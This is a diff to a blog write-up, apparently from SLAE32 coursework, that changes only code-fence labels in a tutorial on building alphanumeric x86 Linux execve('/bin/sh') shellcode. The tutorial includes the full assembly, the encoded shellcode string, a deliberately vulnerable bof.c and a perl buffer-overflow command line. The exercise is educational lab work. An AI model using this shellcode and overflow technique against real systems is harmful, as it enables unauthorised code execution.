@@ -113,7 +113,7 @@ Not so much eh?! Ah and obviously don't forget that operands of these instructio
 No panic, we can obtain a shellcode with a little of creativity. The simple idea behind is to store all that we need on the stack and lastly use the POPAD instruction to load the right things in the right places<br>
 For the lord of simplicity of our shellcode we'll take the simpliest Linux shellcode to manipulate, the ```execve()``` shellcode.<br>
 Our [shellcode](https://blackcloud.me/SLAE32-6/) should work for this purpose:
-```nasm
+```assembly
 cdq                     ; xor edx
 mul edx                 ; xor eax
 lea ecx, [eax]          ; xor ecx
@@ -128,7 +128,7 @@ int 0x80
 ```
 The first 3 instructions serves us to put 0 on our registers but as saw we can't directly use this instruction, but we can use a polymorphism to do the same work with PUSh, POP and XOR, using the stack
 
-```nasm
+```assembly
 push 0x30      ; push 0x30 on the stack
 pop eax        ; place 0x30 in EAX
 xor al, 0x30   ; xor EAX with 0x30 to obtain 0
@@ -154,7 +154,7 @@ xor
 ```
 The result is ```01110111 01110111``` or the equivalent hex ```77 77``` or the equivalent chars ww, so we now prepare the asm code to 
 
-```nasm
+```assembly
 push 0x68735858	    ; push XXsh
 pop eax             ; put XXsh on EAX
 xor ax, 0x7777      ; xor with ww
@@ -164,7 +164,7 @@ pop eax             ; xor the eax to 0
 xor al, 0x30        ;
 ```
 Now we can do a more simple job with /bin, using 0bin in EAX, decremting it by 1 and putting it on the stack after //sh
-```nasm
+```assembly
 xor eax, 0x6e696230 ; push 0bin
 dec eax
 push eax
@@ -186,7 +186,7 @@ Our PUSHAD is a little bit different: EDX, ECX, EBX, EAX, ESP, EBP, ESI, EDI. In
 
 So let's prepare the code:
 
-```nasm
+```assembly
 ; pushad/popad to place /bin/sh in EBX register
 push esp
 pop eax
@@ -205,7 +205,7 @@ push ebx
 ```
 The other things we need is the ```0xb``` value in the EAX register, for that purpose we can find a value or more to xor with 0 to obtain 0xb. Doing the same work as for XXsh we can find that ```0x4a``` and after ```0x41``` can help us
 
-```nasm
+```assembly
 xor al, 0x4a
 xor al, 0x41
 ```
@@ -226,7 +226,7 @@ The ```int 0x80``` has the opcode ```0xcd 0x80``` so we can save the opcode in t
 11001101 10000000 - Result of XOR #2 ($0xcd & $0x80)
 ```
 
-```nasm
+```assembly
 dec eax         ; 0xffffffff in EAX
 xor ax, 0x4f73  ;
 xor ax, 0x3041  ; 0xffff80cd in EAX
@@ -238,7 +238,7 @@ The last problem to solve is that 0xffff80cd must be called as last instruction 
 
 ## The Shellcode
 
-```nasm
+```assembly
 global _start			
 
 section .text
@@ -294,7 +294,7 @@ j0X40PZHf5sOf5A0PRXRj0X40hXXshXf5wwPj0X4050binHPTXRQSPTUVWaPYS4J4A
 ```
 Now we need a simple buffer overflow that permit us to load and execute the shellcode. Let's use a simple C program (bof.c)
 
-```C
+```c
 #include <stdlib.h>
 #include <stdio.h>
 #include <string.h>
@@ -323,7 +323,7 @@ As we can see in this case we can choose an adress at the end of NOP zone before
 ![](/assets/images/linux/x86/alphanumeric_1.gif)<br>
 
 
-```
+```gdb
 [------------------------------------stack-------------------------------------]
 0000| 0xbffff52c --> 0xbffff530 ("/bin//sh")
 0004| 0xbffff530 ("/bin//sh")
@@ -341,7 +341,7 @@ Last thing, call the ```0xffff80cd``` with a JMP ESP instruction. I know it is n
 ![](/assets/images/linux/x86/alphanumeric_2.gif)<br>
 
 So lastly our command is that
-```
+```bash
 ./bof `perl -e 'print "\x90"x48 . "j0X40PZHf5sOf5A0PRXRj0X40hXXshXf5wwPj0X4050binHPTXRQSPTUVWaPYS4J4A" . "D"x16 . "\xff\xe4\x79\xf7\xff\xbf"'`
 ```
 Putting all toghether in a python script and execute it
